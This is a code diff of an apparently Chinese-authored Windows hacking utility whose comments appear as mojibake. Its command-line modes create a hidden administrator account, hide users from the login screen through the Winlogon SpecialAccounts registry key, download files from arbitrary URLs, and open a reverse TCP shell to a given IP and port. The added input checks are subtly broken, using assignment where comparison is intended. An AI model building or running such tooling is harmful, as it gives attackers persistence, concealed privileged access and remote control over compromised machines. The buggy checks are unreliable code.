@@ -120,18 +120,18 @@ int reverse_tcp(char*argv,int port) {
 ///////////////////////////
 
 
-//µÇÂ½½çÃæÒş²ØÖ¸¶¨ÓÃ»§
+//ç™»é™†ç•Œé¢éšè—æŒ‡å®šç”¨æˆ·
 void OnBnClickedChange(char*name)
 {
-	//¶¨ÒåÒ»¸ö·µ»Ø´ò¿ªµÄ¾ä±ú
+	//å®šä¹‰ä¸€ä¸ªè¿”å›æ‰“å¼€çš„å¥æŸ„
 	HKEY hKey = NULL;
 	DWORD szValue = 0;
-	//×¢²á±íÎ»ÖÃ
+	//æ³¨å†Œè¡¨ä½ç½®
 	TCHAR * subKey = _T("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList");
 	DWORD dwOptions = REG_OPTION_NON_VOLATILE;
-	//ĞÂ½¨Ò»¸öÏà²¢·µ»ØÒ»¸ö´ò¿ªµÄ¾ä±ú
+	//æ–°å»ºä¸€ä¸ªç›¸å¹¶è¿”å›ä¸€ä¸ªæ‰“å¼€çš„å¥æŸ„
 	LONG lRet = RegCreateKeyEx(HKEY_LOCAL_MACHINE, subKey, 0, NULL, dwOptions, KEY_ALL_ACCESS | KEY_WOW64_64KEY, NULL, &hKey, NULL);
-	//Ğ´ÈëÖµ
+	//å†™å…¥å€¼
 	LONG lResult = RegSetValueExA(hKey, name, 0, REG_DWORD, (BYTE*)&szValue, sizeof(DWORD));
 
 	if (lRet != ERROR_SUCCESS) {
@@ -144,20 +144,20 @@ void OnBnClickedChange(char*name)
 		exit(0);
 	}
 	printf("ok",name);
-	//³ÌĞò½áÊø£¬¹Ø±Õ´ò¿ªµÄhKEY
+	//ç¨‹åºç»“æŸï¼Œå…³é—­æ‰“å¼€çš„hKEY
 	RegCloseKey(hKey);
 }
-//ÀàĞÍ×ª»»
+//ç±»å‹è½¬æ¢
 wchar_t *c2wc(const char *Str) {
 	wchar_t *Wchar = new wchar_t[strlen(Str) + 1];
 	mbstowcs(Wchar, Str, strlen(Str) + 1);
 	return Wchar;
 }
-//ÏÂÔØº¯Êı
+//ä¸‹è½½å‡½æ•°
 void download(wchar_t szurl[MAXBYTE],wchar_t szpaath[MAX_PATH]) {
 	URLDownloadToFileW(NULL, szurl, szpaath, NULL, NULL);
 }
-//Ìí¼ÓÓÃ»§Ê¹ÓÃÏµÍ³api
+//æ·»åŠ ç”¨æˆ·ä½¿ç”¨ç³»ç»Ÿapi
 void apiAdd(wchar_t *name, wchar_t *pass) {
 	USER_INFO_1 ui;
 	DWORD dwLevel = 1;
@@ -171,7 +171,7 @@ void apiAdd(wchar_t *name, wchar_t *pass) {
 	ui.usri1_comment = NULL;
 	ui.usri1_flags = UF_SCRIPT;
 	ui.usri1_script_path = NULL;
-	// Ìí¼ÓÓÃ»§
+	// æ·»åŠ ç”¨æˆ·
 	nStatus = NetUserAdd(NULL, dwLevel, (LPBYTE)&ui, &dwError);
 
 	if (nStatus == NERR_Success)
@@ -183,7 +183,7 @@ void apiAdd(wchar_t *name, wchar_t *pass) {
 	wcscpy(szAccountName, ui.usri1_name);
 	LOCALGROUP_MEMBERS_INFO_3 account;
 	account.lgrmi3_domainandname = szAccountName;
-	// Ìí¼Óµ½¹ÜÀí×é
+	// æ·»åŠ åˆ°ç®¡ç†ç»„
 	nStatus = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);
 	if (nStatus == ERROR_SUCCESS)
 		wprintf(L"User %s has been added to administrators\n", name);
@@ -203,6 +203,10 @@ int main(int argc, char* argv[])
 		exit(1);
 	}
 	else if (strcmp(argv[1],"-d")==0){
+		if(argv[2]=""){
+			printf("Please enter url");
+			exit(1);
+		}
 		download(c2wc(argv[2]),c2wc(argv[3]));
 		printf("%s""download ok");
 		exit(0);
@@ -210,6 +214,14 @@ int main(int argc, char* argv[])
 
 	else if(strcmp(argv[1],"-u")==0)
 	{
+		if(argv[2]=""){
+			printf("Please enter user");
+			exit(1);
+		}
+		else if(argv[3]=""){
+			printf("Please enter pass");
+			exit(1);
+		}
 		printf("add user %s%s",argv[2],"\n");
 		printf("add pass %s", argv[3],"\n");
 		apiAdd(c2wc(argv[2]), c2wc(argv[3]));
@@ -218,12 +230,24 @@ int main(int argc, char* argv[])
 
 	else if(strcmp(argv[1], "-s")==0)
 	{
+		if(argv[2]=""){
+			printf("Please enter user");
+			exit(1);
+		}
 		OnBnClickedChange(argv[2]);
 		exit(0);
 	}
 
 	else if(strcmp(argv[1],"-r")==0)
 	{
+		if(argv[2]=""){
+			printf("Please enter ip");
+			exit(1);
+		}
+		else if(argv[3]=""){
+			printf("Please enter port");
+			exit(1);
+		}
 		printf(argv[2],"\n");
 		printf(argv[3],"\n");
 		reverse_tcp(argv[2], atoi(argv[3]));
@@ -237,4 +261,3 @@ int main(int argc, char* argv[])
 
     return 0;
 }
-
